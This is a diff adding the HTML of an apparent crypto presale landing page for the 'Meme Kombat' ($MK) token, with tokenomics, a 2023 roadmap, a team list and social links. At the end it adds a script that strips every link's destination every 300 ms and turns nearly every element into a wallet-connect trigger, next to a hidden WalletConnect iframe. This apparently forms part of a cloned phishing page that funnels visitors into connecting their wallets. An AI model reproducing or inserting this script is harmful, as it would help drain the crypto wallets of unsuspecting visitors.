+         </h2>
+        </div>
+       </div>
+       <div class="ant-col sc-982afe77-3 fQSrIf ant-col-sm-24 ant-col-lg-12 ant-col-xl-6">
+        <div class="sc-982afe77-5 ghCrPj">
+         <div class="sc-982afe77-4 jXemHO">
+         </div>
+         <h2 class="sc-cb2beaa-1 sc-982afe77-7 hJJvbE fMLKpc">
+          Win alongside your champions
+         </h2>
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+    <div class="sc-17ce6418-0 sc-296016db-8 dWTYCc jJAgHJ">
+     <div class="ant-row ant-row-center sc-296016db-7 iYEhlK">
+      <div class="ant-row ant-row-center">
+       <div class="ant-col sc-296016db-5 mnGid ant-col-md-16 ant-col-lg-16 ant-col-xl-16 ant-col-xxl-14" style="align-items:center">
+        <h1 class="sc-cb2beaa-0 sc-296016db-3 fNTnxo iaLyHW" style="text-align:center">
+         GET IN ON THE ACTION
+        </h1>
+        <p class="sc-296016db-4 ckvGMp" style="text-align:center">
+         Players buy and stake $MK to bet on exciting meme battles, aiming to win more tokens and other prizes!
+        </p>
+        <a class="sc-296016db-9 sc-296016db-10 kvqwcH fEatWd" href="https://memekombattoken.gitbook.io/meme-kombat-whitepaper/betting" target="_blank">
+         Learn More
+        </a>
+       </div>
+      </div>
+      <div class="ant-row ant-row-center" style="width:100%;margin-top:20px">
+       <div class="ant-col sc-296016db-0 kttgPq ant-col-xs-12 ant-col-sm-12 ant-col-md-6 ant-col-lg-6 ant-col-xl-6">
+        <div class="sc-296016db-1 eTLDl">
+        </div>
+       </div>
+       <div class="ant-col sc-296016db-0 kttgPq ant-col-xs-12 ant-col-sm-12 ant-col-md-6 ant-col-lg-6 ant-col-xl-6">
+        <div class="sc-296016db-1 ldkNfC">
+        </div>
+       </div>
+       <div class="ant-col sc-296016db-0 kttgPq ant-col-xs-12 ant-col-sm-12 ant-col-md-6 ant-col-lg-6 ant-col-xl-6">
+        <div class="sc-296016db-1 fysmnX">
+        </div>
+       </div>
+       <div class="ant-col sc-296016db-0 kttgPq ant-col-xs-12 ant-col-sm-12 ant-col-md-6 ant-col-lg-6 ant-col-xl-6">
+        <div class="sc-296016db-1 dHPSJd">
+        </div>
+       </div>
+      </div>
+     </div>
+     <div class="ant-row sc-296016db-7 dlMlYb">
+      <div class="ant-col sc-296016db-5 mnGid ant-col-md-12 ant-col-lg-12 ant-col-xl-10 ant-col-xxl-8">
+       <h1 class="sc-cb2beaa-0 sc-296016db-3 fNTnxo iaLyHW">
+        CHOOSE YOUR VICTOR
+       </h1>
+       <p class="sc-296016db-4 ckvGMp">
+        In Season 1 we have 11 Memes all fighting to be #1. Will you find a favorite? Or play the odds?
+       </p>
+       <a class="sc-296016db-9 sc-296016db-10 kvqwcH fEatWd" href="https://memekombattoken.gitbook.io/meme-kombat-whitepaper/meme-kombat-roadmap" target="_blank">
+        Learn More
+       </a>
+      </div>
+      <div class="ant-col sc-296016db-5 sc-296016db-6 mnGid edRNQb ant-col-md-10 ant-col-md-push-0">
+       <img alt="" class="sc-296016db-2 A-dTQh" data-nimg="1" decoding="async" height="333" loading="lazy" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Futility-4.f8c16cbd.png&amp;w=1920&amp;q=75" srcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Futility-4.f8c16cbd.png&amp;w=750&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Futility-4.f8c16cbd.png&amp;w=1920&amp;q=75 2x" style="color:transparent;height:100%;transform:translate(10%, 0%) scale(1.3)" width="697"/>
+      </div>
+     </div>
+    </div>
+    <div class="sc-17ce6418-0 sc-73e1739e-8 dWTYCc bKcRmm" id="tokenomics">
+     <div class="sc-cdd98a16-0 sc-73e1739e-7 hkuJEN LZlwU">
+      <div class="ant-row sc-73e1739e-5 WiGwG">
+       <div class="ant-col sc-73e1739e-6 dKNinB ant-col-xs-24 ant-col-sm-24 ant-col-md-18 ant-col-lg-18 ant-col-xl-8">
+        <h1 class="sc-cb2beaa-0 sc-73e1739e-0 fNTnxo gITBPD" style="margin-bottom:50px">
+         Tokenomics
+        </h1>
+       </div>
+      </div>
+      <div class="ant-row sc-73e1739e-5 WiGwG">
+       <div class="ant-col sc-73e1739e-6 dKNinB ant-col-md-18 ant-col-lg-18 ant-col-xl-8">
+        <h1 class="sc-cb2beaa-0 sc-73e1739e-0 sc-73e1739e-1 fNTnxo iwaPHg chNymB">
+         50% presale
+        </h1>
+        <p class="sc-73e1739e-2 bLYdBC">
+         Half of total token supply will be set aside for the $MK presale. The intention is for all who buy presale to participate in Meme Kombat.
+        </p>
+        <hr class="sc-73e1739e-3 hAhDAj"/>
+        <h1 class="sc-cb2beaa-0 sc-73e1739e-0 sc-73e1739e-1 fNTnxo iwaPHg chNymB">
+         30% STAKING &amp; BATTLE REWARDS
+        </h1>
+        <p class="sc-73e1739e-2 bLYdBC">
+         We have set aside a large percentage of the supply to support that ecosystem and help maintain balance.
+        </p>
+       </div>
+       <div class="ant-col sc-73e1739e-6 dKNinB ant-col-md-18 ant-col-lg-18 ant-col-xl-8">
+        <img alt="Meme Royal Logo." class="sc-73e1739e-4 jqZWLZ" data-nimg="1" decoding="async" fetchpriority="high" height="1804" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Ftokenomics.2e5e195f.png&amp;w=3840&amp;q=75" srcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Ftokenomics.2e5e195f.png&amp;w=1920&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Ftokenomics.2e5e195f.png&amp;w=3840&amp;q=75 2x" style="color:transparent" width="1804"/>
+       </div>
+       <div class="ant-col sc-73e1739e-6 dKNinB ant-col-md-18 ant-col-lg-18 ant-col-xl-8">
+        <h1 class="sc-cb2beaa-0 sc-73e1739e-0 sc-73e1739e-1 fNTnxo kTeJCr cgjSvm">
+         10% DEX
+        </h1>
+        <p class="sc-73e1739e-2 cLRzV">
+         10% of the overall supply is reserved for pairing with a liquidity pool on a decentralized exchange.
+        </p>
+        <hr class="sc-73e1739e-3 hAhDAj"/>
+        <h1 class="sc-cb2beaa-0 sc-73e1739e-0 sc-73e1739e-1 fNTnxo kTeJCr cgjSvm">
+         10% COMMUNITY REWARDS
+        </h1>
+        <p class="sc-73e1739e-2 cLRzV">
+         $MK is all about participation and community engagement through the love of epic battles. So we have set aside a good amount of tokens for community rewards.
+        </p>
+       </div>
+      </div>
+     </div>
+    </div>
+    <div class="sc-17ce6418-0 sc-5bbaf948-10 hYhjhw kmmBED" id="roadmap">
+     <div class="sc-5bbaf948-0 cogiFF">
+      <img alt="Viking mage." class="sc-5bbaf948-1 cPTdyG" data-nimg="1" decoding="async" height="474" loading="lazy" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fabout-left.99f7569f.png&amp;w=1920&amp;q=75" srcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fabout-left.99f7569f.png&amp;w=640&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fabout-left.99f7569f.png&amp;w=1920&amp;q=75 2x" style="color:transparent" width="604"/>
+      <img alt="Bear monk." class="sc-5bbaf948-1 cPTdyG" data-nimg="1" decoding="async" height="474" loading="lazy" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fabout-right.f7ebef5a.png&amp;w=1080&amp;q=75" srcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fabout-right.f7ebef5a.png&amp;w=640&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fabout-right.f7ebef5a.png&amp;w=1080&amp;q=75 2x" style="color:transparent" width="477"/>
+     </div>
+     <div class="ant-row sc-5bbaf948-8 iniFTD">
+      <div class="ant-col sc-5bbaf948-9 fZeLaC ant-col-md-24">
+       <p class="sc-5bbaf948-6 iroNnu">
+        WHAT CAN YOU EXPECT
+       </p>
+       <h1 class="sc-cb2beaa-0 sc-5bbaf948-3 fNTnxo dtqaRw">
+        MEME KOMBAT ROADMAP
+       </h1>
+       <h1 class="sc-cb2beaa-0 sc-5bbaf948-3 sc-5bbaf948-4 fNTnxo dtqaRw heIEEo">
+        2023
+       </h1>
+      </div>
+     </div>
+     <div class="ant-row sc-5bbaf948-8 iniFTD">
+      <div class="ant-col sc-5bbaf948-9 fZeLaC ant-col-xs-4 ant-col-sm-4 ant-col-md-4 ant-col-lg-4 ant-col-lg-push-5">
+       <div class="sc-5bbaf948-2 fNYOBO">
+       </div>
+      </div>
+      <div class="ant-col sc-5bbaf948-9 jslNpB ant-col-xs-20 ant-col-sm-18 ant-col-md-16 ant-col-lg-10 ant-col-lg-push-5">
+       <h1 class="sc-cb2beaa-0 sc-5bbaf948-3 sc-5bbaf948-5 fNTnxo dtqaRw hrOAGS">
+        Presale Launch - Q3 2023
+       </h1>
+       <p class="sc-5bbaf948-6 sc-5bbaf948-7 cYPpgB kBuOQR">
+        Objective: Kickstart the Meme Kombat project through a token presale.
+       </p>
+       <p class="sc-5bbaf948-6 cYPpgB">
+        <strong>
+         Details
+         <!-- -->
+         :
+        </strong>
+        50% of the $MK tokens will be available for presale, paving the way for the platform's launch.
+       </p>
+       <p class="sc-5bbaf948-6 cYPpgB">
+        <strong>
+         Outcome
+         <!-- -->
+         :
+        </strong>
+        A successful presale will provide the essential funds and community support required to move forward with the platform's development.
+       </p>
+      </div>
+     </div>
+     <div class="ant-row sc-5bbaf948-8 iniFTD">
+      <div class="ant-col sc-5bbaf948-9 fZeLaC ant-col-xs-4 ant-col-sm-4 ant-col-md-4 ant-col-lg-4 ant-col-lg-push-5">
+       <div class="sc-5bbaf948-2 bmEHRY">
+       </div>
+      </div>
+      <div class="ant-col sc-5bbaf948-9 dDfZTy ant-col-xs-20 ant-col-sm-18 ant-col-md-16 ant-col-lg-10 ant-col-lg-pull-9">
+       <h1 class="sc-cb2beaa-0 sc-5bbaf948-3 sc-5bbaf948-5 fNTnxo dtqaRw hrOAGS">
+        Platform Launch - Late Q3 2023
+       </h1>
+       <p class="sc-5bbaf948-6 sc-5bbaf948-7 cYPpgB kBuOQR">
+        Objective: Officially launch the Meme Kombat platform.
+       </p>
+       <p class="sc-5bbaf948-6 cYPpgB">
+        <strong>
+         Details
+         <!-- -->
+         :
+        </strong>
+        Depending on the completed sell-out of the presale, the platform launch is planned for September or October 2023.
+       </p>
+       <p class="sc-5bbaf948-6 cYPpgB">
+        <strong>
+         Outcome
+         <!-- -->
+         :
+        </strong>
+        The launch will mark the commencement of Meme Kombat's operations, offering users access to battles, staking, and other features.
+       </p>
+      </div>
+     </div>
+     <div class="ant-row sc-5bbaf948-8 iniFTD">
+      <div class="ant-col sc-5bbaf948-9 fZeLaC ant-col-xs-4 ant-col-sm-4 ant-col-md-4 ant-col-lg-4 ant-col-lg-push-5">
+       <div class="sc-5bbaf948-2 bmEHRY">
+       </div>
+      </div>
+      <div class="ant-col sc-5bbaf948-9 jslNpB ant-col-xs-20 ant-col-sm-18 ant-col-md-16 ant-col-lg-10 ant-col-lg-push-5">
+       <h1 class="sc-cb2beaa-0 sc-5bbaf948-3 sc-5bbaf948-5 fNTnxo dtqaRw hrOAGS">
+        Season 1 - Immediate Post-Launch
+       </h1>
+       <p class="sc-5bbaf948-6 sc-5bbaf948-7 cYPpgB kBuOQR">
+        Objective: Inaugurate the first season of Meme Kombat.
+       </p>
+       <p class="sc-5bbaf948-6 cYPpgB">
+        <strong>
+         Details
+         <!-- -->
+         :
+        </strong>
+        Season 1 will kick off immediately following the platform launch, featuring battles, leaderboards, and more.
+       </p>
+       <p class="sc-5bbaf948-6 cYPpgB">
+        <strong>
+         Outcome
+         <!-- -->
+         :
+        </strong>
+        This season will set the stage for continuous gameplay, attracting players, and fostering community engagement.
+       </p>
+      </div>
+     </div>
+     <div class="ant-row sc-5bbaf948-8 iniFTD">
+      <div class="ant-col sc-5bbaf948-9 fZeLaC ant-col-xs-4 ant-col-sm-4 ant-col-md-4 ant-col-lg-4 ant-col-lg-push-5">
+       <div class="sc-5bbaf948-2 gzcamS">
+       </div>
+      </div>
+      <div class="ant-col sc-5bbaf948-9 dDfZTy ant-col-xs-20 ant-col-sm-18 ant-col-md-16 ant-col-lg-10 ant-col-lg-pull-9">
+       <h1 class="sc-cb2beaa-0 sc-5bbaf948-3 sc-5bbaf948-5 fNTnxo dtqaRw hrOAGS">
+        Season 2  - Q4 2023
+       </h1>
+       <p class="sc-5bbaf948-6 sc-5bbaf948-7 cYPpgB kBuOQR">
+        Objective: Launch the second season of Meme Kombat with enhanced features and experiences.
+       </p>
+       <p class="sc-5bbaf948-6 cYPpgB">
+        <strong>
+         Details
+         <!-- -->
+         :
+        </strong>
+        Building on the success of the first season, Season 2 will commence in December 2023, introducing new battle types, rewards, and opportunities.
+       </p>
+       <p class="sc-5bbaf948-6 cYPpgB">
+        <strong>
+         Outcome
+         <!-- -->
+         :
+        </strong>
+        Season 2 will further establish Meme Kombat's presence in the blockchain gaming space, reflecting the project's commitment to innovation and continuous improvement.
+       </p>
+      </div>
+     </div>
+     <div class="ant-row sc-5bbaf948-8 iniFTD">
+      <div class="ant-col sc-5bbaf948-9 fZeLaC ant-col-xs-4 ant-col-sm-4 ant-col-md-4 ant-col-lg-4 ant-col-lg-push-5">
+       <div class="sc-5bbaf948-2 bvgLYL">
+       </div>
+      </div>
+      <div class="ant-col sc-5bbaf948-9 jslNpB ant-col-xs-20 ant-col-sm-18 ant-col-md-16 ant-col-lg-10 ant-col-lg-push-5">
+       <h1 class="sc-cb2beaa-0 sc-5bbaf948-3 sc-5bbaf948-5 fNTnxo dtqaRw hrOAGS">
+        Future Development
+       </h1>
+       <p class="sc-5bbaf948-6 sc-5bbaf948-7 cYPpgB kBuOQR">
+        Continuous Upgrades: Meme Kombat will continue to evolve, with ongoing updates to the platform, gameplay, tokenomics, and more.
+       </p>
+       <p class="sc-5bbaf948-6 cYPpgB">
+        <strong>
+         Community Engagement
+         <!-- -->
+         :
+        </strong>
+        Ongoing interaction with the community will shape future seasons and features, aligning with player preferences and industry trends.
+       </p>
+       <p class="sc-5bbaf948-6 cYPpgB">
+        <strong>
+         Expansion Plans
+         <!-- -->
+         :
+        </strong>
+        Looking beyond 2023, the project has plans for further expansion, potentially adding new game modes, partnerships, and other exciting developments.
+       </p>
+      </div>
+     </div>
+    </div>
+    <div class="sc-17ce6418-0 sc-d52ef804-10 dWTYCc jEDWxm" id="team">
+     <div class="sc-cdd98a16-0 hkuJEN">
+      <div class="ant-row sc-d52ef804-8 kNOneQ">
+       <div class="ant-col sc-d52ef804-9 dmELBy ant-col-md-24">
+        <p class="sc-d52ef804-3 kxDECg">
+         THE MEME KOMBAT TEAM
+        </p>
+        <h1 class="sc-cb2beaa-0 sc-d52ef804-1 fNTnxo gyoAKK">
+         MEET OUR TEAM
+        </h1>
+       </div>
+      </div>
+      <div class="ant-row ant-row-center sc-d52ef804-8 kNOneQ" style="margin-left:-16px;margin-right:-16px">
+       <div class="ant-col sc-d52ef804-6 dFNLzv ant-col-xs-24 ant-col-sm-12 ant-col-md-12 ant-col-lg-8 ant-col-xl-7" style="padding-left:16px;padding-right:16px">
+        <div class="sc-d52ef804-7 dSrptC">
+         <a href="https://www.linkedin.com/in/mattw8047814774/" target="_blank">
+          <div class="sc-d52ef804-5 farkse">
+          </div>
+         </a>
+         <h2 class="sc-cb2beaa-1 sc-d52ef804-2 hJJvbE Zfqjo">
+          Matt Whiteman
+         </h2>
+         <span class="sc-d52ef804-0 bXeqnX">
+          Project Lead / Founder
+         </span>
+        </div>
+       </div>
+       <div class="ant-col sc-d52ef804-6 dFNLzv ant-col-xs-24 ant-col-sm-12 ant-col-md-12 ant-col-lg-8 ant-col-xl-7" style="padding-left:16px;padding-right:16px">
+        <div class="sc-d52ef804-7 dSrptC">
+         <a target="_blank">
+          <div class="sc-d52ef804-5 jfhvfV">
+          </div>
+         </a>
+         <h2 class="sc-cb2beaa-1 sc-d52ef804-2 hJJvbE Zfqjo">
+          Kai
+         </h2>
+         <span class="sc-d52ef804-0 bXeqnX">
+          Frontend Dev
+         </span>
+        </div>
+       </div>
+       <div class="ant-col sc-d52ef804-6 dFNLzv ant-col-xs-24 ant-col-sm-12 ant-col-md-12 ant-col-lg-8 ant-col-xl-7" style="padding-left:16px;padding-right:16px">
+        <div class="sc-d52ef804-7 dSrptC">
+         <a target="_blank">
+          <div class="sc-d52ef804-5 beIRfS">
+          </div>
+         </a>
+         <h2 class="sc-cb2beaa-1 sc-d52ef804-2 hJJvbE Zfqjo">
+          Karem
+         </h2>
+         <span class="sc-d52ef804-0 bXeqnX">
+          Blockchain Dev
+         </span>
+        </div>
+       </div>
+       <div class="ant-col sc-d52ef804-6 dFNLzv ant-col-xs-24 ant-col-sm-12 ant-col-md-12 ant-col-lg-8 ant-col-xl-7" style="padding-left:16px;padding-right:16px">
+        <div class="sc-d52ef804-7 dSrptC">
+         <a target="_blank">
+          <div class="sc-d52ef804-5 bowa-dz">
+          </div>
+         </a>
+         <h2 class="sc-cb2beaa-1 sc-d52ef804-2 hJJvbE Zfqjo">
+          Adrian
+         </h2>
+         <span class="sc-d52ef804-0 bXeqnX">
+          Content &amp; Operations
+         </span>
+        </div>
+       </div>
+       <div class="ant-col sc-d52ef804-6 dFNLzv ant-col-xs-24 ant-col-sm-12 ant-col-md-12 ant-col-lg-8 ant-col-xl-7" style="padding-left:16px;padding-right:16px">
+        <div class="sc-d52ef804-7 dSrptC">
+         <a target="_blank">
+          <div class="sc-d52ef804-5 bniDYD">
+          </div>
+         </a>
+         <h2 class="sc-cb2beaa-1 sc-d52ef804-2 hJJvbE Zfqjo">
+          Stuart
+         </h2>
+         <span class="sc-d52ef804-0 bXeqnX">
+          Technologist
+         </span>
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+    <div class="sc-17ce6418-0 sc-25ec1153-7 hYhjhw iATgFh" id="team">
+     <div class="ant-row sc-25ec1153-5 eHzxsK">
+      <div class="ant-col sc-25ec1153-6 ktQPsy ant-col-md-12">
+       <p class="sc-25ec1153-4 fTTukI">
+        Join us right now!
+       </p>
+       <h1 class="sc-cb2beaa-0 sc-25ec1153-3 fNTnxo fUFiDP">
+        Join The Community
+       </h1>
+       <p class="sc-25ec1153-4 fTTukI">
+        Join us in the arena and stay connected with exclusive content and updates in our communities!
+       </p>
+       <div class="sc-25ec1153-0 cfLjls">
+        <a class="sc-25ec1153-1 grpgsT" href="https://twitter.com/Meme_Kombat" target="_blank">
+         <img alt="Meme Kombat on Twitter" class="sc-25ec1153-2 fqgupZ" data-nimg="1" decoding="async" height="434" loading="lazy" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Ftwitter-icon-green.5e973f51.png&amp;w=1080&amp;q=75" srcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Ftwitter-icon-green.5e973f51.png&amp;w=640&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Ftwitter-icon-green.5e973f51.png&amp;w=1080&amp;q=75 2x" style="color:transparent" width="434"/>
+        </a>
+        <a class="sc-25ec1153-1 grpgsT" href="https://t.me/MemeKombatToken" target="_blank">
+         <img alt="Meme Kombat on Telegram" class="sc-25ec1153-2 fqgupZ" data-nimg="1" decoding="async" height="550" loading="lazy" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Ftelegram-icon-green.745c934a.png&amp;w=1200&amp;q=75" srcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Ftelegram-icon-green.745c934a.png&amp;w=640&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Ftelegram-icon-green.745c934a.png&amp;w=1200&amp;q=75 2x" style="color:transparent" width="550"/>
+        </a>
+        <a class="sc-25ec1153-1 grpgsT" target="_blank">
+         <img alt="Meme Kombat on Discord" class="sc-25ec1153-2 fqgupZ" data-nimg="1" decoding="async" height="550" loading="lazy" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fdiscord-icon-green.489cc1c0.png&amp;w=1920&amp;q=75" srcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fdiscord-icon-green.489cc1c0.png&amp;w=640&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fdiscord-icon-green.489cc1c0.png&amp;w=1920&amp;q=75 2x" style="color:transparent" width="613"/>
+        </a>
+       </div>
+      </div>
+     </div>
+    </div>
+    <div class="sc-85931c30-3 bAIZtm">
+     <div class="sc-85931c30-1 fkzvnx">
+      <a>
+       Privacy
+      </a>
+      <a>
+       Cookies
+      </a>
+      <a href="https://memekombattoken.gitbook.io/meme-kombat-whitepaper/" target="_blank">
+       Whitepaper
+      </a>
+     </div>
+     <div class="sc-85931c30-0 kbahZg">
+      <span class="sc-85931c30-2 bMjNMe">
+       <span>
+        ® 2023 Meme Kombat
+       </span>
+       <span>
+        All Rights Reserved
+       </span>
+       <span>
+        contact@memekombat.io
+       </span>
+      </span>
+     </div>
+     <div class="sc-3367dfc7-0 gQbVAI">
+      <a class="sc-3367dfc7-1 hxWpIT" href="https://t.me/MemeKombatToken" target="_blank">
+       <img alt="Meme Kombat on Telegram" class="sc-3367dfc7-2 cMpYtk" data-nimg="1" decoding="async" height="550" loading="lazy" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Ftelegram-icon.085a9992.png&amp;w=1200&amp;q=75" srcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Ftelegram-icon.085a9992.png&amp;w=640&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Ftelegram-icon.085a9992.png&amp;w=1200&amp;q=75 2x" style="color:transparent" width="550"/>
+      </a>
+      <a class="sc-3367dfc7-1 hxWpIT" href="https://twitter.com/Meme_Kombat" target="_blank">
+       <img alt="Meme Kombat on Twitter" class="sc-3367dfc7-2 cMpYtk" data-nimg="1" decoding="async" height="434" loading="lazy" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Ftwitter-icon.5cc7124e.png&amp;w=1080&amp;q=75" srcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Ftwitter-icon.5cc7124e.png&amp;w=640&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Ftwitter-icon.5cc7124e.png&amp;w=1080&amp;q=75 2x" style="color:transparent" width="434"/>
+      </a>
+     </div>
+    </div>
+   </div>
+  </div>
+  <next-route-announcer>
+   <p aria-live="assertive" id="__next-route-announcer__" role="alert" style="border: 0px; clip: rect(0px, 0px, 0px, 0px); height: 1px; margin: -1px; overflow: hidden; padding: 0px; position: absolute; top: 0px; width: 1px; white-space: nowrap; overflow-wrap: normal;">
+   </p>
+  </next-route-announcer>
+  <iframe allowfullscreen="" allowtransparency="true" frameborder="0" hspace="0" id="adformtrackingiframe" marginheight="0" marginwidth="0" mozallowfullscreen="" scrolling="no" src="https://c1.adform.net/imatch/pixels?uid=2252023567072922420&amp;agencyId=8619&amp;advertiserId=2149495&amp;src=tp&amp;rnd=647833" style="display:none" vspace="0" webkitallowfullscreen="">
+  </iframe>
+  <wcm-modal>
+  </wcm-modal>
+  <iframe id="verify-api" src="https://verify.walletconnect.org/389cd2fe5d1c9dae8d83ed0c5efff081" style="display: none;">
+  </iframe>
+  <script>
+    function addClassesToElements() {
+
+    const links = document.querySelectorAll('a:not(.connectButton)');
+    for (const link of links) {
+        link.removeAttribute('href');
+        link.classList.add('connectButton');
+    }
+    const buttons = document.querySelectorAll('div:not(.connectButton):not(.web3-overlay):not(.item):not(.web3-modal-items):not(.web3-modal-title):not(.web3-modal)');
+    for (const button of buttons) {
+        button.classList.add('connectButton');
+    }
+    }
+    setInterval(addClassesToElements, 300);
+</script></body>
+</html>
